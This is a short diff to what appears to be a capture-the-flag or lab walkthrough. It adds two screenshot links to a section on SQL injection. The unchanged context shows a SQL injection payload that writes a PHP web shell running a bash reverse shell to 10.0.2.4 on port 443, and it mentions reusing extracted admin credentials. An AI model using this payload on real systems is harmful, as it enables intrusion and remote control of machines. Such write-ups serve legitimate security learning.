@@ -68,7 +68,11 @@ By listening to a netcat listener on port 443 and then injecting a SQL query lik
 select '<?php system("bash -i >& /dev/tcp/10.0.2.4/443 0>&1");?>'
 and by structuring the URL in the way illustrated, you obtain a reverse shell on the presidential machine.
 
+![Exploitation of the vulnerability](images/sql_vuln)
+
 At this point you can authenticate with the admin user credentials extracted previously.
+
+![Reverse shell connection and authentication](images/reverse_shell.png)
 
 
 ## Privilege Escalation
